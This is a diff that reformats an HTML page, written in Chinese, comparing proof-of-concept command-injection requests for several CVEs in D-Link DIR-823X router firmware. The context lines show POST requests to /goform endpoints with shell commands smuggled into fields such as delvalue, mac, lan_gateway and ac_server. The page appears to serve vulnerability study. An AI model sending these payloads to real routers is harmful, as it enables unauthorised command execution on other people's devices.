@@ -24,7 +24,9 @@ firmware: "D-Link DIR-823X 240126 / 240802 / 250416"
 
 <h3>CVE-2025-11095</h3>
 
-<div>原始来源：<a href="https://github.com/n1ptune/dink/blob/main/delete_offline_device.md" target="_blank">n1ptune/dink 原始 PoC ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2025-11095" target="_blank">NVD ↗</a></div>
+<div>
+原始来源：<a href="https://github.com/n1ptune/dink/blob/main/delete_offline_device.md" target="_blank">n1ptune/dink 原始 PoC ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2025-11095" target="_blank">NVD ↗</a>
+</div>
 
 <pre>
 POST /goform/<mark>delete_offline_device</mark> HTTP/1.1
@@ -38,7 +40,9 @@ Connection: close
 <mark>delvalue=%27</mark>+%3B+ls+%2F+%3E+%2Ftmp%2Fls.log+%23&amp;token=&lt;TOKEN&gt;
 </pre>
 
-<div>变化：接口是 delete_offline_device；字段是 delvalue。</div>
+<div>
+变化：接口是 delete_offline_device；字段是 delvalue。
+</div>
 
 </section>
 
@@ -46,7 +50,9 @@ Connection: close
 
 <h3>CVE-2025-11097</h3>
 
-<div>原始来源：<a href="https://github.com/n1ptune/dink/blob/main/set_device_name.md" target="_blank">n1ptune/dink 原始 PoC ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2025-11097" target="_blank">NVD ↗</a></div>
+<div>
+原始来源：<a href="https://github.com/n1ptune/dink/blob/main/set_device_name.md" target="_blank">n1ptune/dink 原始 PoC ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2025-11097" target="_blank">NVD ↗</a>
+</div>
 
 <pre>
 POST /goform/<mark>set_device_name</mark> HTTP/1.1
@@ -60,7 +66,9 @@ Connection: close
 <mark>mac=%27</mark>+%3B+ls+%2F+%3E+%2Ftmp%2Fls.log+%23&amp;token=&lt;TOKEN&gt;
 </pre>
 
-<div>变化：接口是 set_device_name；字段是 mac。</div>
+<div>
+变化：接口是 set_device_name；字段是 mac。
+</div>
 
 </section>
 
@@ -85,7 +93,9 @@ Connection: close
 
 <h3>CVE-2025-11095</h3>
 
-<div>原始来源：<a href="https://github.com/n1ptune/dink/blob/main/delete_offline_device.md" target="_blank">n1ptune/dink 原始 PoC ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2025-11095" target="_blank">NVD ↗</a></div>
+<div>
+原始来源：<a href="https://github.com/n1ptune/dink/blob/main/delete_offline_device.md" target="_blank">n1ptune/dink 原始 PoC ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2025-11095" target="_blank">NVD ↗</a>
+</div>
 
 <pre>
 POST /goform/<mark>delete_offline_device</mark> HTTP/1.1
@@ -99,7 +109,9 @@ Connection: close
 <mark>delvalue=%27</mark>+%3B+ls+%2F+%3E+%2Ftmp%2Fls.log+%23&amp;token=&lt;TOKEN&gt;
 </pre>
 
-<div>公共重点：delvalue 字段、删除类 goform、命令写入日志。</div>
+<div>
+公共重点：delvalue 字段、删除类 goform、命令写入日志。
+</div>
 
 </section>
 
@@ -107,7 +119,9 @@ Connection: close
 
 <h3>CVE-2025-11099</h3>
 
-<div>原始来源：<a href="https://github.com/n1ptune/dink/blob/main/uci_del_in_delete_prohibiting.md" target="_blank">n1ptune/dink 原始 PoC ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2025-11099" target="_blank">NVD ↗</a></div>
+<div>
+原始来源：<a href="https://github.com/n1ptune/dink/blob/main/uci_del_in_delete_prohibiting.md" target="_blank">n1ptune/dink 原始 PoC ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2025-11099" target="_blank">NVD ↗</a>
+</div>
 
 <pre>
 POST /goform/<mark>delete_prohibiting</mark> HTTP/1.1
@@ -121,7 +135,9 @@ Connection: close
 <mark>delvalue=%7C%7C</mark>+ls+%23&amp;token=&lt;TOKEN&gt;
 </pre>
 
-<div>变化：接口是 delete_prohibiting；载荷边界从 ' ; … # 变为 || ls #。</div>
+<div>
+变化：接口是 delete_prohibiting；载荷边界从 ' ; … # 变为 || ls #。
+</div>
 
 </section>
 
@@ -146,7 +162,9 @@ Connection: close
 
 <h3>CVE-2026-1544</h3>
 
-<div>原始来源：<a href="https://github.com/master-abc/cve/issues/16" target="_blank">master-abc/cve Issue 16 ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2026-1544" target="_blank">NVD ↗</a></div>
+<div>
+原始来源：<a href="https://github.com/master-abc/cve/issues/16" target="_blank">master-abc/cve Issue 16 ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2026-1544" target="_blank">NVD ↗</a>
+</div>
 
 <pre>
 POST /goform/<mark>set_mode</mark> HTTP/1.1
@@ -160,7 +178,9 @@ Connection: close
 <mark>modeSelection</mark>=0&amp;proto=dhcp&amp;lan_ipaddr=192.168.1.1&amp;lan_netmask=255.255.255.0&amp;<mark>lan_gateway</mark>=192.168.1.1%22%0Asleep+3%0Aecho+%22&amp;set_flag=0&amp;token=&lt;TOKEN&gt;
 </pre>
 
-<div>变化：接口 set_mode；注入字段 lan_gateway。</div>
+<div>
+变化：接口 set_mode；注入字段 lan_gateway。
+</div>
 
 </section>
 
@@ -168,7 +188,9 @@ Connection: close
 
 <h3>CVE-2026-2063</h3>
 
-<div>原始来源：<a href="https://github.com/master-abc/cve/issues/19" target="_blank">master-abc/cve Issue 19 ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2026-2063" target="_blank">NVD ↗</a></div>
+<div>
+原始来源：<a href="https://github.com/master-abc/cve/issues/19" target="_blank">master-abc/cve Issue 19 ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2026-2063" target="_blank">NVD ↗</a>
+</div>
 
 <pre>
 POST /goform/<mark>set_ac_server</mark> HTTP/1.1
@@ -182,7 +204,9 @@ Connection: close
 <mark>ac_server_mode</mark>=0&amp;<mark>ac_server</mark>=192.168.1.1%22%0Asleep+3%0Aecho+%22&amp;token=&lt;TOKEN&gt;
 </pre>
 
-<div>变化：接口 set_ac_server；注入字段 ac_server。</div>
+<div>
+变化：接口 set_ac_server；注入字段 ac_server。
+</div>
 
 </section>
 
